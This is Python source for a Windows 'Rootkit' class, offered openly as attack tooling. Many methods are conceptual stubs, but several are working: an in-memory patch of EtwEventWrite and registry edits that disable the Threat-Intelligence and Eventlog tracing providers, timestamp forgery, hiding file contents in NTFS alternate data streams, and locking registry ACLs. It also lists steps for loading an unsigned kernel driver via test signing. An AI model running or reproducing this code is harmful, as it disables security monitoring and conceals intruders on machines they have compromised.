import ctypes, ctypes.wintypes, struct, os, sys, threading, time, hashlib
from ctypes import wintypes
import win32api, win32con, win32process, win32security, win32file
import psutil, ntpath

class Rootkit:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        self.psapi = ctypes.windll.psapi
        self.hidden_processes = set()
        self.hidden_files = set()
        self.hidden_registry = set()
        
        # Load necessary functions
        self.setup_nt_functions()
    
    def setup_nt_functions(self):
        """Setup NT API function prototypes."""
        # NtQuerySystemInformation
        self.NtQuerySystemInformation = self.ntdll.NtQuerySystemInformation
        self.NtQuerySystemInformation.argtypes = [
            wintypes.ULONG,  # SystemInformationClass
            wintypes.LPVOID, # SystemInformation
            wintypes.ULONG,  # SystemInformationLength
            wintypes.PULONG  # ReturnLength
        ]
        self.NtQuerySystemInformation.restype = wintypes.LONG
        
        # NtSetInformationThread
        self.NtSetInformationThread = self.ntdll.NtSetInformationThread
        self.NtSetInformationThread.argtypes = [
            wintypes.HANDLE,  # ThreadHandle
            wintypes.ULONG,   # ThreadInformationClass
            wintypes.LPVOID,  # ThreadInformation
            wintypes.ULONG    # ThreadInformationLength
        ]
        self.NtSetInformationThread.restype = wintypes.LONG
        
        # Other NT functions would be defined here
    
    def hide_process(self, pid):
        """Hide a process from enumeration."""
        methods = [
            self.hide_process_peb,
            self.hide_process_dkom,
            self.hide_process_hook
        ]
        
        results = []
        for method in methods:
            try:
                result = method(pid)
                results.append(result)
                if "success" in result.lower():
                    self.hidden_processes.add(pid)
                    break
            except Exception as e:
                results.append(f"{method.__name__} failed: {e}")
        
        return results
    
    def hide_process_peb(self, pid):
        """Hide process by manipulating PEB (Process Environment Block)."""
        # This is a conceptual implementation
        # Actual PEB manipulation requires kernel access or injection
        
        try:
            # Open process with necessary permissions
            PROCESS_ALL_ACCESS = 0x1F0FFF
            hProcess = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            
            if not hProcess:
                return "Failed to open process"
            
            # In reality, we would:
            # 1. Read process memory to find PEB
            # 2. Modify the BeingDebugged flag or other fields
            # 3. Remove from active process links
            
            self.kernel32.CloseHandle(hProcess)
            
            return f"PEB manipulation attempted for PID {pid} (conceptual)"
            
        except Exception as e:
            return f"PEB hide failed: {e}"
    
    def hide_process_dkom(self, pid):
        """Hide process using Direct Kernel Object Manipulation (DKOM)."""
        # DKOM requires kernel driver
        # This is a conceptual explanation
        
        return f"DKOM would require kernel driver to manipulate EPROCESS structure for PID {pid}"
    
    def hide_process_hook(self, pid):
        """Hide process by hooking enumeration APIs."""
        # Hook NtQuerySystemInformation to filter out our process
        return "API hooking would filter process from enumeration lists"
    
    def hide_file(self, filepath):
        """Hide a file from directory listings."""
        methods = [
            self.hide_file_attributes,
            self.hide_file_filter_driver,
            self.hide_file_ads
        ]
        
        results = []
        for method in methods:
            try:
                result = method(filepath)
                results.append(result)
                if "success" in result.lower() or "hidden" in result.lower():
                    self.hidden_files.add(os.path.abspath(filepath))
                    break
            except Exception as e:
                results.append(f"{method.__name__} failed: {e}")
        
        return results
    
    def hide_file_attributes(self, filepath):
        """Hide file using Windows file attributes."""
        try:
            if not os.path.exists(filepath):
                return f"File does not exist: {filepath}"
            
            # Get current attributes
            attrs = win32file.GetFileAttributes(filepath)
            
            # Add HIDDEN attribute
            win32file.SetFileAttributes(filepath, attrs | win32con.FILE_ATTRIBUTE_HIDDEN)
            
            # Add SYSTEM attribute (makes it more hidden)
            win32file.SetFileAttributes(filepath, attrs | win32con.FILE_ATTRIBUTE_HIDDEN | 
                                      win32con.FILE_ATTRIBUTE_SYSTEM)
            
            return f"File {filepath} hidden with HIDDEN+SYSTEM attributes"
            
        except Exception as e:
            return f"File attribute hide failed: {e}"
    
    def hide_file_filter_driver(self, filepath):
        """Hide file using filesystem filter driver (conceptual)."""
        # This would require a kernel driver
        return "Filter driver would intercept filesystem requests and hide specific files"
    
    def hide_file_ads(self, filepath):
        """Hide data in Alternate Data Stream (NTFS)."""
        try:
            # Create an ADS with our data
            ads_name = f"hidden_{hashlib.md5(filepath.encode()).hexdigest()[:8]}"
            ads_path = f"{filepath}:{ads_name}"
            
            # Write some data to ADS
            with open(ads_path, 'wb') as f:
                f.write(b"Hidden data in ADS")
            
            # Move original file data to ADS
            if os.path.getsize(filepath) < 1024 * 1024:  # If smaller than 1MB
                with open(filepath, 'rb') as src:
                    data = src.read()
                
                with open(ads_path, 'wb') as dst:
                    dst.write(data)
                
                # Zero out original file
                with open(filepath, 'wb') as f:
                    f.write(b'\x00' * len(data))
            
            return f"Data hidden in ADS: {ads_path}"
            
        except Exception as e:
            return f"ADS hide failed: {e}"
    
    def hide_network_connection(self, local_port=None, remote_ip=None):
        """Hide network connection from netstat."""
        methods = [
            self.hide_connection_hook,
            self.hide_connection_dkom
        ]
        
        results = []
        for method in methods:
            try:
                result = method(local_port, remote_ip)
                results.append(result)
            except Exception as e:
                results.append(f"{method.__name__} failed: {e}")
        
        return results
    
    def hide_connection_hook(self, local_port, remote_ip):
        """Hide connection by hooking network APIs."""
        # Hook GetTcpTable, GetUdpTable, etc.
        return f"Would hook network APIs to hide connection: {local_port} -> {remote_ip}"
    
    def hide_connection_dkom(self, local_port, remote_ip):
        """Hide connection using DKOM on TCP/IP driver objects."""
        return "DKOM on TCPIP.sys driver structures would hide connections"
    
    def hide_registry_key(self, key_path):
        """Hide registry key from enumeration."""
        try:
            # Convert path to absolute
            if key_path.startswith('HKLM\\'):
                root = win32con.HKEY_LOCAL_MACHINE
                subkey = key_path[5:]
            elif key_path.startswith('HKCU\\'):
                root = win32con.HKEY_CURRENT_USER
                subkey = key_path[5:]
            else:
                return "Only HKLM and HKCU supported"
            
            # Open parent key
            parent_path, key_name = ntpath.split(subkey)
            
            try:
                parent_key = win32api.RegOpenKeyEx(root, parent_path, 0, win32con.KEY_ALL_ACCESS)
            except:
                return f"Parent key not found: {parent_path}"
            
            # In reality, to truly hide a registry key we would need to:
            # 1. Use kernel driver to manipulate CM registry structures
            # 2. Or use legitimate name that doesn't attract attention
            
            # For now, we can set restrictive permissions
            sid = win32security.LookupAccountName("", "SYSTEM")[0]
            dacl = win32security.ACL()
            
            # Add SYSTEM full control
            dacl.AddAccessAllowedAce(win32security.ACL_REVISION,
                                   win32con.KEY_ALL_ACCESS,
                                   sid)
            
            # Set empty DACL (no access for anyone else)
            sd = win32security.SECURITY_DESCRIPTOR()
            sd.SetSecurityDescriptorDacl(1, dacl, 0)
            
            try:
                key = win32api.RegOpenKeyEx(parent_key, key_name, 0, win32con.KEY_ALL_ACCESS)
                win32api.RegSetKeySecurity(key, win32security.DACL_SECURITY_INFORMATION, sd)
                win32api.RegCloseKey(key)
            except:
                # Key might not exist, create it with restrictive permissions
                key = win32api.RegCreateKeyEx(parent_key, key_name, 0, None, 0,
                                            win32con.KEY_ALL_ACCESS, sd)[0]
                win32api.RegCloseKey(key)
            
            win32api.RegCloseKey(parent_key)
            self.hidden_registry.add(key_path)
            
            return f"Registry key {key_path} secured with restrictive permissions"
            
        except Exception as e:
            return f"Registry hide failed: {e}"
    
    def process_hollowing(self, target_process, payload_path):
        """Perform process hollowing."""
        # Create suspended process
        # Unmap its memory
        # Allocate new memory with our payload
        # Set entry point to our payload
        # Resume process
        
        return f"Process hollowing would replace {target_process} with {payload_path}"
    
    def dll_injection_stealth(self, pid, dll_path):
        """Stealth DLL injection techniques."""
        techniques = [
            "Thread Execution Hijacking",
            "APC Injection",
            "Early Bird APC Injection",
            "Thread Local Storage (TLS) Callback",
            "DLL Proxying",
            "DLL Sideloading with signed binaries",
            "Reflective DLL Injection"
        ]
        
        return f"Stealth injection options for PID {pid}: {', '.join(techniques[:3])}"
    
    def bypass_etw(self):
        """Bypass Event Tracing for Windows."""
        methods = [
            self.patch_etw_providers,
            self.disable_etw_via_registry,
            self.hook_etw_functions
        ]
        
        results = []
        for method in methods:
            try:
                result = method()
                results.append(result)
            except Exception as e:
                results.append(f"{method.__name__} failed: {e}")
        
        return results
    
    def patch_etw_providers(self):
        """Patch ETW providers in memory."""
        try:
            # Find and patch EtwEventWrite
            etw_event_write = self.ntdll.EtwEventWrite
            
            # Make memory writable
            old_protect = wintypes.DWORD(0)
            self.kernel32.VirtualProtect(etw_event_write, 4, 0x40, ctypes.byref(old_protect))
            
            # Patch with return 0 (success)
            # In reality: C2 14 00 = ret 0x14
            patch = b"\xC2\x14\x00"
            ctypes.memmove(etw_event_write, patch, 3)
            
            # Restore protection
            self.kernel32.VirtualProtect(etw_event_write, 4, old_protect, ctypes.byref(old_protect))
            
            return "ETW patched in memory (EtwEventWrite)"
            
        except Exception as e:
            return f"ETW patch failed: {e}"
    
    def disable_etw_via_registry(self):
        """Disable ETW via registry."""
        try:
            import winreg
            
            # Disable certain ETW providers
            key_path = r"SYSTEM\CurrentControlSet\Control\WMI\Autologger"
            
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            
            # Disable Microsoft-Windows-Threat-Intelligence
            subkey = winreg.CreateKey(key, "{F4EEDD8C-FAEE-4E76-9B6D-8C6D329DD5B6}")
            winreg.SetValueEx(subkey, "Start", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(subkey)
            
            # Disable other security-related providers
            security_providers = [
                "{D02B9F27-6B13-4C6B-97E2-6C3C6A6E8DBC}",  # MS-Windows-Eventlog
                "{F4EEDD8C-FAEE-4E76-9B6D-8C6D329DD5B6}",  # Threat-Intelligence
            ]
            
            for provider in security_providers:
                try:
                    subkey = winreg.CreateKey(key, provider)
                    winreg.SetValueEx(subkey, "Start", 0, winreg.REG_DWORD, 0)
                    winreg.CloseKey(subkey)
                except:
                    pass
            
            winreg.CloseKey(key)
            
            return "ETW providers disabled via registry"
            
        except Exception as e:
            return f"ETW registry disable failed: {e}"
    
    def hook_etw_functions(self):
        """Hook ETW-related functions."""
        return "Would hook EtwEventWrite, EtwEventWriteEx, etc. to filter events"
    
    def timestomp(self, target_file, source_file=None):
        """Copy timestamps from one file to another."""
        try:
            if not source_file:
                # Use legitimate system file
                source_file = "C:\\Windows\\System32\\kernel32.dll"
            
            if not os.path.exists(source_file):
                return f"Source file not found: {source_file}"
            
            if not os.path.exists(target_file):
                return f"Target file not found: {target_file}"
            
            # Get source timestamps
            source_stat = os.stat(source_file)
            
            # Set target timestamps
            os.utime(target_file, (source_stat.st_atime, source_stat.st_mtime))
            
            # Also modify creation time if possible
            try:
                # This requires pywin32
                import pywintypes
                winfile = win32file.CreateFile(
                    target_file,
                    win32con.GENERIC_WRITE,
                    0, None, win32con.OPEN_EXISTING,
                    0, None
                )
                
                ctime = pywintypes.Time(source_stat.st_ctime)
                win32file.SetFileTime(winfile, ctime, None, None)
                win32file.CloseHandle(winfile)
            except:
                pass
            
            return f"Timestamps copied from {source_file} to {target_file}"
            
        except Exception as e:
            return f"Timestomp failed: {e}"
    
    def get_hidden_items(self):
        """Get list of currently hidden items."""
        return {
            'processes': list(self.hidden_processes),
            'files': list(self.hidden_files),
            'registry': list(self.hidden_registry)
        }
    
    def unhide_all(self):
        """Unhide all hidden items."""
        results = []
        
        # Unhide files (remove HIDDEN attribute)
        for filepath in list(self.hidden_files):
            try:
                if os.path.exists(filepath):
                    attrs = win32file.GetFileAttributes(filepath)
                    win32file.SetFileAttributes(filepath, attrs & ~win32con.FILE_ATTRIBUTE_HIDDEN)
                    results.append(f"Unhid file: {filepath}")
            except:
                pass
        
        # Clear lists
        self.hidden_processes.clear()
        self.hidden_files.clear()
        self.hidden_registry.clear()
        
        results.append("All items marked for unhiding (some require restart)")
        
        return results
    
    def install_kernel_driver(self):
        """Conceptual kernel driver installation."""
        # This would require:
        # 1. Driver file (.sys)
        # 2. Service creation
        # 3. Driver signing bypass or test signing mode
        # 4. Load driver
        
        steps = [
            "1. Create or obtain kernel driver (.sys file)",
            "2. Copy to system directory (e.g., C:\\Windows\\System32\\drivers)",
            "3. Create service via sc.exe or Service Control Manager",
            "4. Enable test signing mode (bcdedit /set testsigning on)",
            "5. Load driver via NtLoadDriver or ServiceStart",
            "6. Driver performs SSDT hook, DKOM, etc."
        ]
        
        return "Kernel driver installation steps:\n" + "\n".join(steps)
    
    def hook_ssdt(self):
        """Hook System Service Descriptor Table (conceptual)."""
        return "SSDT hooking would intercept system calls at kernel level"
    
    def iat_hook(self, target_process, dll_name, function_name, hook_function):
        """Perform IAT (Import Address Table) hooking."""
        return f"IAT hook would redirect {dll_name}!{function_name} in process {target_process}"